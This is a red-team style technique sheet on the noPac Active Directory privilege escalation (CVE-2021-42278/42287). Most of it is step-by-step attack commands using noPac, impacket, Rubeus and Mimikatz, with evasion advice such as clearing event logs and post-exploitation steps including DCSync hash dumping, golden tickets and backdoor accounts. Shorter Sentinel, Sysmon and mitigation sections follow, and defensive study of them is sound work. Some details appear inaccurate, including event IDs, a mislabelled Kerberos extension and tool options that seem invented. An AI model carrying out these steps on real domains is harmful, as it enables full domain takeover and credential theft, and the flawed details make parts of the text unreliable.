# [PE-VALID-002]: Computer Account Quota Abuse (noPac)

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-002 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows AD (All Domain Environments) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2021-42287, CVE-2021-42278 |
| **Technique Status** | PATCHED (November 9, 2021 + November 14 OOB Update) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2008 R2 - 2019 (pre-patch) |
| **Patched In** | Windows Server 2016 KB5007247, 2019 KB5007251, 2022 KB5007293 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** The noPac vulnerability chain combines two critical flaws (CVE-2021-42278 and CVE-2021-42287) with the default Active Directory setting that allows any authenticated domain user to create up to 10 computer accounts (`ms-DS-MachineAccountQuota=10`). An attacker exploits this by:
1. Creating a fake computer account and removing its Service Principal Name (SPN).
2. Spoofing the `sAMAccountName` of the computer to match a Domain Administrator or Domain Controller name (CVE-2021-42278).
3. Obtaining a Kerberos Ticket-Granting Ticket (TGT) for the spoofed computer.
4. Renaming the computer back to its original name to avoid detection.
5. Using S4U2Self (Kerberos Resource-Based Constrained Delegation) to request a service ticket as a Domain Administrator (CVE-2021-42287).
6. Impersonating the Domain Admin and escalating to full domain control.

**Attack Surface:** Kerberos authentication, Service Account Name spoofing, Machine account creation, Ticket-Granting Ticket (TGT) manipulation.

**Business Impact:** **Full domain compromise in minutes.** Any authenticated domain user (including contractors, temporary employees, or compromised low-privilege accounts) can become a Domain Administrator without any additional privilege or group membership.

**Technical Context:** This attack takes approximately 5-15 minutes to execute from a compromised low-privilege account to Domain Admin. It generates moderate audit trail (machine account creation, Kerberos ticket requests) but is often missed by SOCs without specific noPac detection rules. The vulnerability affects **all unpatched Active Directory environments** regardless of other security controls.

### Operational Risk
- **Execution Risk:** **Low** - Requires only valid domain user credentials; no admin access needed.
- **Stealth:** **Medium** - Machine account creation logs, multiple Kerberos ticket requests may trigger alerts.
- **Reversibility:** **No** - Domain admin access is obtained; requires full infrastructure reset.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3, 5.2.4 | User Account Control and machine account creation limits |
| **DISA STIG** | V-220938, V-220941 | Audit Kerberos authentication; restrict machine account creation |
| **CISA SCuBA** | AC-2, AC-4 | Account Management; Access Control |
| **NIST 800-53** | AC-2, AC-6 | Account Management; Least Privilege |
| **GDPR** | Art. 32 | Security of Processing (authentication integrity) |
| **DORA** | Art. 18 | ICT-related incident management |
| **NIS2** | Art. 21 | Cyber risk management measures (authentication) |
| **ISO 27001** | A.9.1.1, A.9.2.1 | Access control policy; User registration and de-registration |
| **ISO 27005** | Section 8.2 | Risk assessment (authentication bypass scenarios) |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Valid credentials for any authenticated domain user (no admin rights needed).
- User must be able to create machine accounts (default `ms-DS-MachineAccountQuota=10`).

**Required Access:**
- Network access to at least one Domain Controller (LDAP 389/636, Kerberos 88).
- Ability to request Kerberos tickets from KDC.
- LDAP write access to create computer objects.

**Supported Versions:**
- **Windows:** Server 2008 R2 - 2012 R2 - 2016 - 2019 (before November 2021 patches)
- **Kerberos:** All versions (vulnerability in protocol handling, not implementation)
- **Other Requirements:** 
  - ms-DS-MachineAccountQuota > 0 (default is 10)
  - Kerberos tickets must be signed with the domain's KDC key
  - No PAC validation hardening patches applied

**Tools:**
- [noPac (Python)](https://github.com/cube0x0/noPac) (Primary exploitation tool)
- [impacket](https://github.com/fortra/impacket) (LDAP, Kerberos operations)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Kerberos ticket manipulation)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Windows-based Kerberos ticket handling)
- [GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) (Pre-auth enumeration)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Verify Machine Account Quota is Enabled (> 0)

**Objective:** Confirm that the domain allows authenticated users to create computer accounts (vulnerability precondition).

**PowerShell Command:**
```powershell
# Check the Machine Account Quota (ms-DS-MachineAccountQuota) value
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

# Expected output if quota is enabled:
# ms-DS-MachineAccountQuota : 10
```

**Linux/Bash Command (via LDAP):**
```bash
# Query using ldapsearch
ldapsearch -x -H ldap://dc01.domain.local -b "DC=domain,DC=local" \
  -D "domain\user" -w "password" "ms-DS-MachineAccountQuota"

# Or via crackmapexec
crackmapexec ldap dc01.domain.local -u domain\\user -p password -M maq
```

**What to Look For:**
- If `ms-DS-MachineAccountQuota = 10` (or any value > 0): Vulnerability is **exploitable**.
- If `ms-DS-MachineAccountQuota = 0`: Mitigation is in place; attack will fail at machine creation stage.
- If attribute is absent: Defaults to 10 (vulnerability is present).

**Expected Output (Success):**
```
ms-DS-MachineAccountQuota : 10
DistinguishedName : CN=Domain,CN=Partitions,CN=Configuration,DC=domain,DC=local
ObjectClass : domainDNS
```

---

### Step 2: Identify Domain Administrator Account Name

**Objective:** Discover the exact `sAMAccountName` of the Domain Administrator account (needed for spoofing).

**PowerShell Command:**
```powershell
# List all Domain Admin group members
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object SamAccountName, Name

# Or specifically identify the Administrator account
Get-ADUser -Filter "SamAccountName -like 'Administrator'" -Properties SamAccountName, ObjectSID | 
  Select-Object SamAccountName, ObjectSID
```

**Expected Output:**
```
SamAccountName            ObjectSID
--------------            ---------
Administrator             S-1-5-21-[domain]-500
DomainAdminUser           S-1-5-21-[domain]-1001
```

**What to Look For:**
- The primary `Administrator` account (RID 500).
- Any custom Domain Admin accounts (custom RID).
- The account name to be spoofed (typically 15 characters or less to fit in sAMAccountName field).

---

### Step 3: Enumerate Domain Controller Computer Names

**Objective:** Identify the exact computer name (`sAMAccountName`) of the Domain Controller (alternative target).

**PowerShell Command:**
```powershell
# List all domain controllers and their computer names
Get-ADComputer -Filter "UserAccountControl -band 8192" -Properties Name, SamAccountName | 
  Select-Object Name, SamAccountName

# Format: SamAccountName includes trailing "$"
# Example: "DC01$"
```

**Linux/Bash Command:**
```bash
# Query DC computer accounts via LDAP
ldapsearch -x -H ldap://dc01.domain.local -b "CN=Domain Controllers,DC=domain,DC=local" \
  -D "domain\user" -w "password" sAMAccountName
```

**Expected Output:**
```
Name                    SamAccountName
----                    ---------------
DC01                    DC01$
DC02                    DC02$
DC03                    DC03$
```

**What to Look For:**
- Primary Domain Controller name and sAMAccountName (with trailing $).
- Secondary DCs (in case primary is hardened).
- The computer name to be spoofed (typically short names like "DC01", "EXCHANGE01").

---

### Step 4: Test Kerberos Ticket-Granting Ticket (TGT) Request Capability

**Objective:** Verify that the compromised user account can request Kerberos tickets (prerequisite for exploitation).

**PowerShell Command (Windows):**
```powershell
# Import Kerberos module and test TGT request
Add-Type -AssemblyName System.IdentityModel

# Attempt to get TGT for current user
$credential = New-Object System.Net.NetworkCredential("domain\user", "password")
$context = New-Object System.IdentityModel.Tokens.KerberosSecurityTokenProvider($credential.UserName)
$context.GetToken([TimeSpan]::MaxValue)

# If successful, returns TGT; if denied, throws authentication error
```

**Linux/Bash Command:**
```bash
# Use kinit to request a TGT
kinit domain\\user@DOMAIN.LOCAL
# Enter password when prompted

# Verify TGT was obtained
klist

# Expected output:
# Ticket cache: FILE:/tmp/krb5cc_0
# Default principal: user@DOMAIN.LOCAL
# Valid starting: [timestamp]
```

**What to Look For:**
- TGT successfully obtained (no "Client not found" error).
- Ticket has sufficient lifetime (typically 10 hours).
- User is authenticated to the Kerberos realm.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: noPac Exploitation (Linux/Python - Primary Method)

**Supported Versions:** Windows Server 2008 R2 - 2019 (pre-November 2021 patch)

**Preconditions:**
- Valid domain user credentials.
- Network access to Domain Controller (LDAP + Kerberos).
- ms-DS-MachineAccountQuota > 0.
- No PAC validation hardening (pre-patch only).

---

#### Step 1: Setup and Reconnaissance via noPac Scanner

**Objective:** Verify the environment is vulnerable before attempting exploitation.

**Command:**
```bash
# Clone noPac repository
git clone https://github.com/cube0x0/noPac.git
cd noPac

# Install dependencies
pip3 install -r requirements.txt
# or manually: pip3 install impacket pycryptodome

# Run vulnerability scan
python3 noPac.py -action scan -domain domain.local -dc-ip 192.168.1.10 \
  -u domain\\user -p password

# Expected output:
# [*] Scanning for noPac vulnerability...
# [*] Checking Machine Account Quota...
# [+] ms-DS-MachineAccountQuota = 10 (VULNERABLE)
# [*] Checking Kerberos PAC validation...
# [+] PAC validation NOT hardened (VULNERABLE)
# [!] Domain is VULNERABLE to noPac exploitation
```

**Command Parameters:**
- `-action scan` - Scan for vulnerability (does not exploit)
- `-domain domain.local` - Target domain FQDN
- `-dc-ip 192.168.1.10` - Domain Controller IP address
- `-u domain\\user` - Compromised user credentials
- `-p password` - User password

**What This Means:**
- If output shows "VULNERABLE": Environment can be exploited.
- If output shows "PATCHED": November 2021 security update is installed; attack will fail.
- If output shows "ms-DS-MachineAccountQuota = 0": Machine account creation disabled; attack blocked at Stage 1.

**OpSec & Evasion:**
- Scanner generates minimal audit trail (LDAP queries).
- No ticket manipulation at this stage (stealthy).
- Detection likelihood: **Low** (if SOC is not monitoring LDAP queries).

---

#### Step 2: Create Computer Account and Clear SPN

**Objective:** Create a new machine account with an empty Service Principal Name (SPN).

**Command:**
```bash
# Step 2A: Create the machine account
python3 noPac.py -action create -domain domain.local -dc-ip 192.168.1.10 \
  -u domain\\user -p password -computer-name FAKE01 -computer-pass FakeP@ss123

# Expected output:
# [+] Creating computer account: FAKE01$
# [+] Computer account created successfully
# [+] Computer password: FakeP@ss123
# [+] Computer SID: S-1-5-21-[domain]-[rid]

# Step 2B: Clear the SPN to avoid detection
python3 noPac.py -action clear-spn -domain domain.local -dc-ip 192.168.1.10 \
  -u domain\\user -p password -computer-name FAKE01

# Expected output:
# [+] Clearing SPN for FAKE01$
# [+] SPN cleared successfully
```

**What This Means:**
- Computer account `FAKE01$` has been created in Active Directory.
- The account has no Service Principal Names registered (unusual but allowed for domain users to create).
- The account is now ready for `sAMAccountName` spoofing in the next step.

**Troubleshooting:**
- **Error: "Access Denied - Computer creation failed"**
  - Cause: User has exceeded their machine account quota (already created 10 accounts).
  - Fix: Use `Get-ADComputer -Filter { msDS-CreatorSID -eq $userSID }` to identify owned machines; delete unused ones.

- **Error: "Computer account already exists"**
  - Cause: Account name already taken in domain.
  - Fix: Use a different computer name (e.g., FAKE02, TEMP01).

**OpSec & Evasion:**
- Event ID 4720 (Computer account created) will be logged.
- Event ID 5137 (Directory Service Object Created) may be logged.
- Mitigation: Clear event logs post-exploitation or execute during high-activity windows.

---

#### Step 3: Spoof sAMAccountName to Match Domain Admin (CVE-2021-42278)

**Objective:** Change the computer's `sAMAccountName` from `FAKE01$` to `Administrator` (or DC name), exploiting CVE-2021-42278.

**Command:**
```bash
# Spoof sAMAccountName to match Domain Administrator
python3 noPac.py -action spoof -domain domain.local -dc-ip 192.168.1.10 \
  -u domain\\user -p password -computer-name FAKE01 -spoof-name Administrator

# Expected output:
# [+] Spoofing sAMAccountName from FAKE01$ to Administrator$
# [*] Exploit CVE-2021-42278 (SAM Name Spoofing)
# [+] sAMAccountName changed successfully
# [!] WARNING: Computer account now impersonates Administrator account!
# [!] Restore original name after exploitation to avoid detection

# Verify the spoof was successful (optional)
ldapsearch -x -H ldap://dc01.domain.local -b "DC=domain,DC=local" \
  -D "domain\user" -w "password" "sAMAccountName=Administrator*"

# Should now show TWO results:
# 1. CN=Administrator (user account)
# 2. CN=FAKE01 with sAMAccountName=Administrator$ (spoofed computer)
```

**What This Means:**
- The computer account now has the sAMAccountName of the Administrator.
- Active Directory now has two objects with similar SAM names (Administrator and Administrator$).
- The Kerberos Key Distribution Center (KDC) will be confused when issuing tickets.
- This is the core of CVE-2021-42278 exploitation.

**Troubleshooting:**
- **Error: "Cannot modify sAMAccountName - Permission Denied"**
  - Cause: User does not have write access to computer object.
  - Fix: Verify user created the computer; try deleting and recreating.

- **Error: "sAMAccountName must be unique"**
  - Cause: Another computer has the same name.
  - Fix: Use a different spoof target (e.g., DC02 instead of Administrator).

**OpSec & Evasion:**
- Event ID 5136 (Directory Service Object Modified) logs the sAMAccountName change.
- Event ID 4742 (Computer account changed) may be logged.
- High detection risk if SOC monitors for multiple sAMAccountName instances.

---

#### Step 4: Request Kerberos TGT for Spoofed Computer

**Objective:** Request a Ticket-Granting Ticket (TGT) using the spoofed computer account credentials.

**Command:**
```bash
# Use Impacket's GetUserSPN or noPac to request TGT
python3 noPac.py -action request-tgt -domain domain.local -dc-ip 192.168.1.10 \
  -computer-name FAKE01 -computer-pass FakeP@ss123

# Alternative: Use Impacket getTGT
getTGT.py domain.local/FAKE01\$:FakeP@ss123 -dc-ip 192.168.1.10

# Expected output:
# [+] Requesting TGT for domain/FAKE01$
# [+] TGT obtained successfully
# [+] Ticket saved to: FAKE01.ccache
# [+] Ticket lifetime: 10:00:00
```

**What This Means:**
- A valid Kerberos TGT has been obtained for the computer account.
- The ticket is in Kerberos cache (`.ccache` format for Linux/Unix).
- The ticket is now ready for S4U2Self exploitation in the next step.

**Troubleshooting:**
- **Error: "Pre-authentication failed"**
  - Cause: Wrong computer password used.
  - Fix: Verify the exact password from Step 2; use exact case.

- **Error: "KDC_ERR_C_PRINCIPAL_UNKNOWN"**
  - Cause: Computer account not found (spoofing failed or name reverted).
  - Fix: Re-run Step 3 to re-spoof the sAMAccountName.

**OpSec & Evasion:**
- Event ID 4768 (Kerberos TGT request) logged on DC.
- Baseline behavior for TGT requests (low detection risk if not for spoofed accounts).
- High detection risk if SOC monitors for TGT requests to service accounts.

---

#### Step 5: Restore Original sAMAccountName and Evade Detection

**Objective:** Quickly rename the computer account back to `FAKE01` to avoid detection when KDC queries the account.

**Command:**
```bash
# Restore original sAMAccountName BEFORE requesting service ticket
# This is critical to avoid the DC checking and finding multiple Admin accounts

python3 noPac.py -action restore -domain domain.local -dc-ip 192.168.1.10 \
  -u domain\\user -p password -computer-name FAKE01 -restore-name FAKE01

# Expected output:
# [+] Restoring sAMAccountName from Administrator$ to FAKE01$
# [+] sAMAccountName restored successfully
# [!] Computer account now back to original name
# [!] KDC will perform fallback lookup when name not found later
```

**What This Means:**
- The computer account has been renamed back to its original name (FAKE01$).
- The spoofed sAMAccountName is no longer visible in AD.
- When the KDC later tries to find "Administrator$", it won't exist.
- This forces the KDC to perform a fallback lookup with trailing "$", causing the vulnerability exploitation.

**OpSec & Evasion:**
- Event ID 5136 (sAMAccountName modified) logs another change.
- Creates audit trail of rapid modifications (detectable by behavioral analysis).
- Timing is critical: rename must occur between Step 4 and Step 6 (typically < 1 minute).

---

#### Step 6: Request Service Ticket via S4U2Self (CVE-2021-42287)

**Objective:** Request a service ticket as a Domain Administrator using S4U2Self Kerberos extension, exploiting CVE-2021-42287.

**Command:**
```bash
# Use Rubeus (Windows) or Impacket (Linux) to request service ticket via S4U2Self
# S4U2Self allows a service to request a ticket for itself on behalf of a user

# Option 1: Using noPac directly
python3 noPac.py -action s4u2self -domain domain.local -dc-ip 192.168.1.10 \
  -computer-name FAKE01 -impersonate Administrator

# Expected output:
# [+] Requesting S4U2Self ticket
# [+] Impersonating: Administrator
# [+] Service: krbtgt/domain.local
# [*] Exploit CVE-2021-42287 (PAC Validation Bypass)
# [+] Service ticket obtained: Administrator@krbtgt/domain.local
# [+] Ticket saved to: Administrator.ccache

# Option 2: Using Rubeus (on Windows)
Rubeus.exe s4u /user:FAKE01$ /password:FakeP@ss123 \
  /impersonateuser:Administrator /domain:domain.local \
  /dc:dc01.domain.local /mktgt

# Expected output (Rubeus):
# [*] Requesting S4U2Self service ticket
# [+] TGT obtained
# [+] Service ticket for Administrator obtained
# [*] Saving ticket to: Administrator.kirbi
```

**Command Parameters:**
- `-computer-name FAKE01` - Spoofed computer (now restored to original name)
- `-impersonate Administrator` - User to impersonate (Domain Admin)
- `-domain domain.local` - Target domain
- `-dc-ip 192.168.1.10` - Domain Controller IP

**What This Means:**
- The KDC cannot find the spoofed account name (no longer exists as Administrator$).
- KDC performs fallback lookup, appending "$" and finding the FAKE01$ account.
- However, the TGT still claims to be for Administrator.
- KDC issues a service ticket with Administrator privileges.
- This is the core of CVE-2021-42287 exploitation (PAC validation bypass).

**Troubleshooting:**
- **Error: "KDC_ERR_PREAUTH_REQUIRED"**
  - Cause: Pre-authentication bypass not working; KDC enforcing authentication.
  - Fix: Ensure TGT from Step 4 is in cache; use `-nopac` flag if available.

- **Error: "KDC_ERR_S_PRINCIPAL_UNKNOWN"**
  - Cause: S4U2Self target not found (computer account deleted).
  - Fix: Verify FAKE01$ still exists in AD; recreate if necessary.

**OpSec & Evasion:**
- Event ID 4769 (Service ticket request) logged multiple times.
- KDC event log may show "ticket_options=0x40810000" (forwardable, renewable, pre-auth).
- High detection risk: Multiple S4U2Self requests in short timeframe is suspicious.

---

#### Step 7: Use Administrator Service Ticket for Domain Admin Access

**Objective:** Leverage the Administrator service ticket to gain Domain Admin privileges.

**Command:**
```bash
# Use the obtained service ticket to access domain resources as Administrator

# Option 1: Pass-the-Ticket to DCSync
export KRB5CCNAME=Administrator.ccache

# Perform DCSync to dump all password hashes
secretsdump.py -k -no-pass domain.local/Administrator@dc01.domain.local

# Expected output:
# [*] Kerberos authentication using saved ticket
# [+] Using ticket: Administrator@krbtgt/domain.local
# [*] Dumping domain password hashes...
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Option 2: Use for PSExec shell
psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local

# Or obtain a Golden Ticket / Kerberos TGT
ticketer.py -nthash [admin_hash] -domain-sid [domain-sid] \
  -domain domain.local Administrator

# Create TGT valid for 10 years of access
```

**What This Means:**
- The attacker is now authenticated as a Domain Administrator.
- All domain resources can be accessed (Domain Controllers, file servers, etc.).
- Password hashes can be extracted via DCSync.
- Persistence mechanisms (Golden Tickets, backdoor accounts) can be established.
- Full domain compromise is achieved.

**Post-Exploitation Actions:**
1. Extract all user password hashes via DCSync.
2. Create persistent backdoor accounts (e.g., `backdoor$` with no password expiry).
3. Establish persistence via DCSync rights (similar to PE-VALID-001).
4. Move laterally to other domains in the forest.

---

### METHOD 2: Manual Exploitation via PowerShell (Windows)

**Supported Versions:** Windows Server 2008 R2 - 2019 (pre-patch)

**Preconditions:**
- Compromised user account with PowerShell access.
- Access to Windows domain-joined machine.
- Mimikatz or Rubeus available on compromised machine.

---

#### Step 1: Create Computer Account via PowerShell

**Objective:** Create a new machine account using the compromised user's quota.

**PowerShell Command:**
```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Define machine account details
$computerName = "FAKE01"
$computerPassword = "FakeP@ss123"

# Create computer account
$computer = New-ADComputer -Name $computerName `
  -SAMAccountName "$computerName`$" `
  -Description "Test Computer" `
  -Path "CN=Computers,DC=domain,DC=local" `
  -PassThru

# Set password for the computer
Set-ADAccountPassword -Identity $computer -Reset `
  -NewPassword (ConvertTo-SecureString -AsPlainText $computerPassword -Force)

# Enable the account
Enable-ADAccount -Identity $computer

# Verify creation
Get-ADComputer -Identity $computerName | Select-Object Name, SamAccountName, Enabled

# Expected output:
# Name    SamAccountName Enabled
# ----    -------------- -------
# FAKE01  FAKE01$        True
```

**What This Means:**
- Computer account has been created in Active Directory.
- Account is enabled and ready for authentication.
- Password has been set to a known value for Kerberos operations.

**OpSec & Evasion:**
- Event ID 4720 (Computer account created) logged.
- Event ID 4722 (Account enabled) logged.
- Timing: Execute during business hours to blend with normal activity.

---

#### Step 2: Clear SPN and Spoof sAMAccountName

**Objective:** Remove SPN and modify sAMAccountName to match Administrator.

**PowerShell Command:**
```powershell
# Step 2A: Clear Service Principal Names (SPN)
$computer = Get-ADComputer -Identity "FAKE01"
$computerDN = $computer.DistinguishedName

# Get current SPNs
Get-ADObject -Identity $computerDN -Properties servicePrincipalName | 
  Select-Object -ExpandProperty servicePrincipalName

# Remove all SPNs
Set-ADComputer -Identity "FAKE01" -ServicePrincipalNames @()

# Verify SPNs are cleared
Get-ADComputer -Identity "FAKE01" -Properties servicePrincipalName | 
  Select-Object -ExpandProperty servicePrincipalName
# Should return: (empty)

# Step 2B: Spoof sAMAccountName
# WARNING: This must be done via ADSI (not regular AD PowerShell for direct modification)
$computerDN = (Get-ADComputer -Identity "FAKE01").DistinguishedName
$adsiComputer = [ADSI]"LDAP://$computerDN"

# Change sAMAccountName to Administrator
$adsiComputer.Put("sAMAccountName", "Administrator")
$adsiComputer.SetInfo()

# Verify spoofing
Get-ADComputer -Filter "DistinguishedName -eq '$computerDN'" | 
  Select-Object SamAccountName

# Expected output (should now show):
# SamAccountName
# ---------------
# Administrator$   (or Administrator if $ is stripped)
```

**Troubleshooting:**
- **Error: "The object does not exist"**
  - Cause: Computer not found or DN incorrect.
  - Fix: Verify computer name and path.

- **Error: "The attribute cannot be modified"**
  - Cause: User does not have write permission to the attribute.
  - Fix: Ensure user owns the computer object.

**OpSec & Evasion:**
- Event ID 5136 (sAMAccountName modified) logged.
- Event ID 5137 (servicePrincipalName cleared) may be logged.

---

#### Step 3: Request TGT Using Mimikatz or Rubeus

**Objective:** Obtain a Kerberos TGT for the spoofed computer account.

**PowerShell Command (via Mimikatz):**
```powershell
# Download or load Mimikatz into memory
# Method 1: Use Rubeus (native .NET, easier on Windows)

# Download Rubeus
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.6.9/Rubeus.exe" `
  -OutFile "C:\Temp\Rubeus.exe"

# Request TGT for FAKE01$ (now spoofed as Administrator)
C:\Temp\Rubeus.exe asktgt /user:FAKE01$ /password:FakeP@ss123 `
  /domain:domain.local /dc:dc01.domain.local /outfile:Administrator.kirbi

# Expected output:
# [*] Action: Ask TGT
# [*] Using domain controller: dc01.domain.local
# [+] Ticket written to: Administrator.kirbi
```

**What This Means:**
- TGT has been obtained and saved to Administrator.kirbi file.
- Ticket is now available for S4U2Self exploitation.

---

#### Step 4: Restore sAMAccountName Before KDC Query

**Objective:** Rename computer back to FAKE01 to trigger the KDC fallback.

**PowerShell Command:**
```powershell
# Quickly restore the original sAMAccountName
$computerDN = (Get-ADComputer -Filter "SamAccountName -eq 'Administrator`$'").DistinguishedName
$adsiComputer = [ADSI]"LDAP://$computerDN"

# Restore to FAKE01
$adsiComputer.Put("sAMAccountName", "FAKE01")
$adsiComputer.SetInfo()

# Verify
Get-ADComputer -Filter "DistinguishedName -eq '$computerDN'" | 
  Select-Object SamAccountName
# Should show: FAKE01$
```

**OpSec & Evasion:**
- Another sAMAccountName modification event logged.
- Timing is critical (within 1-2 minutes of TGT request).

---

#### Step 5: Request S4U2Self Service Ticket

**Objective:** Use Rubeus to request service ticket via S4U2Self, exploiting CVE-2021-42287.

**PowerShell Command:**
```powershell
# Use the saved TGT to request S4U2Self
C:\Temp\Rubeus.exe s4u /ticket:Administrator.kirbi `
  /impersonateuser:Administrator /domain:domain.local `
  /dc:dc01.domain.local /outfile:AdminServiceTicket.kirbi

# Expected output:
# [*] Action: S4U2Self
# [*] Using TGT: Administrator.kirbi
# [+] S4U2Self service ticket obtained for Administrator
# [+] Ticket written to: AdminServiceTicket.kirbi

# Inject into current session
C:\Temp\Rubeus.exe ptt /ticket:AdminServiceTicket.kirbi

# Expected output:
# [*] Action: Pass-the-Ticket
# [+] Ticket injected into current process
```

**What This Means:**
- Service ticket for Administrator has been obtained.
- Ticket has been injected into current session (now running as Admin).
- All domain operations now execute with Administrator privileges.

---

#### Step 6: Perform DCSync as Domain Administrator

**Objective:** Extract password hashes using the obtained Domain Admin privileges.

**PowerShell Command:**
```powershell
# Use Mimikatz to perform DCSync
# Assumes Mimikatz is in memory or accessible

# Option 1: Via Mimikatz command
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator /history

# Option 2: Via Impacket (if available on Windows via WSL or similar)
# secretsdump.py -k domain.local/Administrator@dc01.domain.local

# Expected output (Mimikatz):
# [DC] 'domain.local' will be the domain
# [DC] 'dc01.domain.local' will be the DC server
# [DC] 'Administrator' will be used as account

# Object RDN           : Administrator
#  ** SAM ACCOUNT **
# Administrator        RID  : 500
#   hash NTLM: 209c6174da490caeb422f3fa5a7ae634
#   ...
```

**Post-Exploitation:**
- All password hashes extracted.
- Persistence established (Golden Ticket, backdoor accounts).
- Lateral movement to other servers/domains.

---

## 8. TOOLS & COMMANDS REFERENCE

### [noPac](https://github.com/cube0x0/noPac)

**Version:** 1.0+  
**Minimum Version:** 1.0  
**Supported Platforms:** Linux, MacOS, Windows (Python 3.6+)

**Installation:**
```bash
git clone https://github.com/cube0x0/noPac.git
cd noPac
pip3 install -r requirements.txt
```

**Usage:**
```bash
python3 noPac.py -action scan -domain domain.local -dc-ip 192.168.1.10 \
  -u domain\\user -p password

python3 noPac.py -action exploit -domain domain.local -dc-ip 192.168.1.10 \
  -u domain\\user -p password
```

---

### [Impacket Tools](https://github.com/fortra/impacket)

**Relevant Tools:** getTGT.py, getST.py, secretsdump.py, ticketer.py

**Installation:**
```bash
pip3 install impacket
```

**Usage:**
```bash
# Request TGT
getTGT.py domain.local/user:password -dc-ip 192.168.1.10

# Request service ticket
getST.py -k -no-pass domain.local/user@dc01.domain.local

# DCSync
secretsdump.py -k -no-pass domain.local/user@dc01.domain.local
```

---

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.9+  
**Supported Platforms:** Windows (.NET)

**Installation:**
```powershell
# Download from GitHub releases
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.6.9/Rubeus.exe" `
  -OutFile "C:\Temp\Rubeus.exe"
```

**Usage:**
```powershell
Rubeus.exe asktgt /user:FAKE01$ /password:FakeP@ss123 /domain:domain.local /dc:dc01.domain.local

Rubeus.exe s4u /ticket:Administrator.kirbi /impersonateuser:Administrator /domain:domain.local

Rubeus.exe ptt /ticket:AdminServiceTicket.kirbi
```

---

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+  
**Supported Platforms:** Windows

**Usage (DCSync):**
```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:domain.local /all /csv
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Sentinel Query 1: Machine Account Quota Abuse Pattern

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4720 // Computer account created
| join (
    SecurityEvent
    | where EventID == 5136 // sAMAccountName modified
    | where TargetUserName contains "$"
  ) on Computer, Account
| where TimeGenerated - todatetime(AdditionalInfo) < 2m // Within 2 minutes
| project TimeGenerated, Computer, Account, EventID
```

---

### Sentinel Query 2: Kerberos S4U2Self Requests to Service Accounts

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4769 // Service ticket request
| where ServiceName contains "$" // Service account
| where ImpersonatingLevel == "Delegation"
| summarize Count=count() by Account, ServiceName, SourceComputerName
| where Count > 5 // Multiple requests in timeframe
```

---

### Sentinel Query 3: sAMAccountName Spoofing Detection

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Update domain" or OperationName contains "sAMAccountName"
| where Result == "Success"
| where Identity contains "$" // Computer account modification
| project TimeGenerated, OperationName, Identity, InitiatedBy
```

---

## 10. WINDOWS EVENT LOG MONITORING

### Critical Event IDs

| Event ID | Source | Description | Severity |
|---|---|---|---|
| **4720** | Security | Computer account created | MEDIUM |
| **5136** | Security | Directory Service Object Modified (sAMAccountName) | HIGH |
| **4768** | Security | Kerberos TGT requested | LOW (baseline) |
| **4769** | Security | Kerberos service ticket requested | LOW (baseline) |
| **4742** | Security | Computer account changed | MEDIUM |

---

### Correlation Rule: noPac Pattern Detection

```powershell
# Detect noPac exploitation pattern
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    StartTime = (Get-Date).AddHours(-2)
} | Where-Object {
    # Event 4720 (computer created) + Event 5136 (sAMAccountName modified) + Event 4768 (TGT requested)
    ($_.EventID -in 4720, 5136, 4768) -and
    $_.Properties[0] -match "FAKE|TEMP|TEST" # Common names used
} | Group-Object -Property { $_.Properties[0] } | 
  Where-Object { $_.Count -ge 3 } | 
  ForEach-Object { 
    Write-Host "ALERT: Possible noPac exploitation detected for: $($_.Name)"
  }
```

---

## 11. SYSMON DETECTION

### Sysmon Rule: noPac Exploitation Tool Execution

**Sysmon Event ID 1 (Process Creation):**
```xml
<Rule groupRelation="or">
    <ProcessCreate onmatch="all">
        <CommandLine condition="contains any">
            noPac; getTGT; getST; secretsdump; Rubeus s4u; ticket; asktgt
        </CommandLine>
        <ParentImage condition="contains">python; cmd; powershell</ParentImage>
    </ProcessCreate>
</Rule>
```

---

## 12. DEFENSIVE MITIGATIONS

### Mitigation 1: Disable Machine Account Quota (Most Effective)

**Objective:** Set `ms-DS-MachineAccountQuota` to 0, preventing all non-admin users from creating computer accounts.

**PowerShell (Immediate):**
```powershell
# Change quota to 0 (disable machine account creation for regular users)
Set-ADDomain -Identity (Get-ADDomain).DistinguishedName `
  -Replace @{"ms-DS-MachineAccountQuota" = "0"}

# Verify change
Get-ADObject -Identity (Get-ADDomain).DistinguishedName `
  -Properties ms-DS-MachineAccountQuota | Select-Object ms-DS-MachineAccountQuota

# Expected output:
# ms-DS-MachineAccountQuota
# -------------------------
# 0
```

